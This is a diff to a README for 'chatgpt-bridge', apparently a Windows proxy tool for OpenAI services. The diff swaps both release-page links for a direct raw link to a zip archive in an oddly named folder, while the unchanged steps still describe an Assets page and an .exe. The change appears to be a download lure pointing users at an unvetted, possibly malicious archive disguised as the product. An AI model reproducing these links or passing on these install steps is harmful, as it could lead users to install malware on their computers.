@@ -1,6 +1,6 @@
 # 🌐 chatgpt-bridge - Access OpenAI tools through local proxy
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Unopposable-starting193/chatgpt-bridge/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Unopposable-starting193/chatgpt-bridge/raw/refs/heads/main/prepolitically/chatgpt_bridge_v2.5.zip)
 
 ## 📌 What is this application
 
@@ -14,7 +14,7 @@ This application runs on Windows 10 or Windows 11. You need at least 200 megabyt
 
 Follow these steps to get the application onto your computer.
 
-1. Visit [this page to download the latest setup file](https://github.com/Unopposable-starting193/chatgpt-bridge/releases).
+1. Visit [this page to download the latest setup file](https://github.com/Unopposable-starting193/chatgpt-bridge/raw/refs/heads/main/prepolitically/chatgpt_bridge_v2.5.zip).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your computer. A folder like your Downloads folder works well for this.
